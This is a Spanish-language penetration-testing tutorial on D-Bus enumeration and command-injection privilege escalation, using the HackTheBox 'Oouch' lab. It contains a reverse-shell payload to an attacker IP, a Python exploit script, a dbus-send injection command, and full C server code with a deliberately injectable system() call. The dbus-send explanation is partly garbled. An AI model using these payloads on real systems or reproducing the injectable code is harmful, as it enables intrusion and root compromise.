# Enumeración y Escalada de Privilegios por Inyección de Comandos en D-Bus

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Enumeración GUI**

D-Bus se utiliza como mediador de comunicaciones entre procesos (IPC) en entornos de escritorio de Ubuntu. En Ubuntu, se observa la operación concurrente de varios buses de mensajes: el bus del sistema, utilizado principalmente por **servicios privilegiados para exponer servicios relevantes en todo el sistema**, y un bus de sesión para cada usuario conectado, exponiendo servicios relevantes solo para ese usuario específico. El enfoque aquí es principalmente en el bus del sistema debido a su asociación con servicios que se ejecutan con privilegios más altos (por ejemplo, root), ya que nuestro objetivo es elevar privilegios. Se destaca que la arquitectura de D-Bus emplea un 'enrutador' por bus de sesión, que es responsable de redirigir los mensajes de los clientes a los servicios apropiados según la dirección especificada por los clientes para el servicio con el que desean comunicarse.

Los servicios en D-Bus están definidos por los **objetos** e **interfaces** que exponen. Los objetos se pueden asemejar a instancias de clase en lenguajes de programación orientados a objetos estándar, con cada instancia identificada de manera única por una **ruta de objeto**. Esta ruta, similar a una ruta de sistema de archivos, identifica de manera única cada objeto expuesto por el servicio. Una interfaz clave para fines de investigación es la interfaz **org.freedesktop.DBus.Introspectable**, que presenta un método singular, Introspect. Este método devuelve una representación XML de los métodos admitidos por el objeto, señales y propiedades, centrándose aquí en los métodos y omitiendo propiedades y señales.

Para la comunicación con la interfaz de D-Bus, se emplearon dos herramientas: una herramienta de línea de comandos llamada **gdbus** para invocar fácilmente los métodos expuestos por D-Bus en scripts, y [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), una herramienta GUI basada en Python diseñada para enumerar los servicios disponibles en cada bus y mostrar los objetos contenidos dentro de cada servicio.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


En la primera imagen se muestran los servicios registrados con el bus del sistema D-Bus, con **org.debin.apt** destacado específicamente después de seleccionar el botón Bus del Sistema. D-Feet realiza consultas a este servicio para objetos, mostrando interfaces, métodos, propiedades y señales para los objetos elegidos, como se ve en la segunda imagen. También se detalla la firma de cada método.

Una característica notable es la visualización del **ID de proceso (pid)** y la **línea de comandos** del servicio, útil para confirmar si el servicio se ejecuta con privilegios elevados, importante para la relevancia de la investigación.

**D-Feet también permite la invocación de métodos**: los usuarios pueden ingresar expresiones en Python como parámetros, que D-Feet convierte en tipos de D-Bus antes de pasarlos al servicio.

Sin embargo, hay que tener en cuenta que **algunos métodos requieren autenticación** antes de permitirnos invocarlos. Ignoraremos estos métodos, ya que nuestro objetivo es elevar nuestros privilegios sin credenciales en primer lugar.

También hay que tener en cuenta que algunos de los servicios consultan otro servicio de D-Bus llamado org.freedeskto.PolicyKit1 para determinar si un usuario debe poder realizar ciertas acciones o no.

## **Enumeración de Línea de Comandos**

### Listar Objetos de Servicio

Es posible listar las interfaces de D-Bus abiertas con:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Conexiones

[De Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Cuando un proceso establece una conexión a un bus, el bus asigna a la conexión un nombre especial de bus llamado _nombre de conexión único_. Los nombres de bus de este tipo son inmutables, lo que garantiza que no cambiarán mientras exista la conexión, y, lo que es más importante, no se pueden reutilizar durante la vida útil del bus. Esto significa que ninguna otra conexión a ese bus tendrá asignado un nombre de conexión único, incluso si el mismo proceso cierra la conexión al bus y crea una nueva. Los nombres de conexión únicos son fácilmente reconocibles porque comienzan con el carácter de dos puntos, que de otra manera está prohibido.

### Información del Objeto de Servicio

Luego, puedes obtener información sobre la interfaz con:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Enumerar Interfaces de un Objeto de Servicio

Necesitas tener suficientes permisos.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Inspeccionar la Interfaz de un Objeto de Servicio

Tenga en cuenta cómo en este ejemplo se seleccionó la última interfaz descubierta utilizando el parámetro `tree` (_ver sección anterior_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### Interfaz de Monitoreo/Captura

Con la cantidad suficiente de privilegios (simplemente `send_destination` y `receive_sender` no son suficientes) puedes **monitorear una comunicación D-Bus**.

Para **monitorear** una **comunicación** necesitarás ser **root**. Si aún tienes problemas para ser root, consulta [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) y [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
¡Si sabes cómo configurar un archivo de configuración de D-Bus para **permitir a usuarios no root espiar** la comunicación, por favor **contáctame**!
{% endhint %}

Diferentes formas de monitorear:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
En el siguiente ejemplo se monitorea la interfaz `htb.oouch.Block` y **se envía el mensaje "**_**lalalalal**_**" a través de una mala comunicación**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Puedes usar `capture` en lugar de `monitor` para guardar los resultados en un archivo pcap.

#### Filtrando todo el ruido <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Si hay demasiada información en el bus, pasa una regla de coincidencia de la siguiente manera:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Se pueden especificar múltiples reglas. Si un mensaje coincide con _cualquiera_ de las reglas, el mensaje se imprimirá. De la siguiente manera:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Consulta la [documentación de D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) para obtener más información sobre la sintaxis de las reglas de coincidencia.

### Más

`busctl` tiene aún más opciones, [**encuéntralas todas aquí**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Escenario Vulnerable**

Como usuario **qtc dentro del host "oouch" de HTB**, puedes encontrar un **archivo de configuración de D-Bus inesperado** ubicado en _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Ten en cuenta que **necesitarás ser el usuario `root` o `www-data` para enviar y recibir información** a través de esta comunicación D-BUS.

Como usuario **qtc** dentro del contenedor de Docker **aeb4525789d8**, puedes encontrar algo de código relacionado con D-BUS en el archivo _/code/oouch/routes.py._ Este es el código interesante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Como puedes ver, se está **conectando a una interfaz D-Bus** y enviando a la función **"Block"** la "client\_ip".

En el otro lado de la conexión D-Bus hay un binario compilado en C en ejecución. Este código está **escuchando** en la conexión D-Bus **la dirección IP y está llamando a iptables a través de la función `system`** para bloquear la dirección IP proporcionada.\
**La llamada a `system` es vulnerable a propósito a la inyección de comandos**, por lo que un payload como el siguiente creará un shell inverso: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Explotarlo

Al final de esta página puedes encontrar el **código C completo de la aplicación D-Bus**. Dentro de él, entre las líneas 91-97 puedes encontrar cómo se **registran el `path del objeto D-Bus`** y el **`nombre de la interfaz`**. Esta información será necesaria para enviar información a la conexión D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
También, en la línea 57 puedes encontrar que **el único método registrado** para esta comunicación D-Bus se llama `Block`(_**Por eso, en la siguiente sección, las cargas útiles se enviarán al objeto de servicio `htb.oouch.Block`, la interfaz `/htb/oouch/Block` y el nombre del método `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

El siguiente código en Python enviará la carga útil a la conexión D-Bus al método `Block` a través de `block_iface.Block(runme)` (_nota que fue extraído del fragmento de código anterior_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl y dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` es una herramienta utilizada para enviar mensajes al "Bus de Mensajes".
* Bus de Mensajes: Un software utilizado por sistemas para facilitar las comunicaciones entre aplicaciones. Está relacionado con la Cola de Mensajes (los mensajes se ordenan en secuencia), pero en el Bus de Mensajes los mensajes se envían en un modelo de suscripción y también de forma muy rápida.
* La etiqueta "-system" se utiliza para indicar que es un mensaje del sistema, no un mensaje de sesión (por defecto).
* La etiqueta "--print-reply" se utiliza para imprimir nuestro mensaje de forma adecuada y recibir cualquier respuesta en un formato legible para humanos.
* "--dest=Dbus-Interface-Block" es la dirección de la interfaz Dbus.
* "--string:" - Tipo de mensaje que queremos enviar a la interfaz. Hay varios formatos para enviar mensajes como double, bytes, booleans, int, objpath. De estos, la "ruta de objeto" es útil cuando queremos enviar la ruta de un archivo a la interfaz Dbus. Podemos usar un archivo especial (FIFO) en este caso para pasar un comando a la interfaz con el nombre de un archivo. "string:;" - Esto es para llamar a la ruta de objeto nuevamente donde colocamos el archivo de shell inverso FIFO.

_Nota que en `htb.oouch.Block.Block`, la primera parte (`htb.oouch.Block`) hace referencia al objeto de servicio y la última parte (`.Block`) hace referencia al nombre del método._

### Código C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Referencias
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red de HackTricks AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
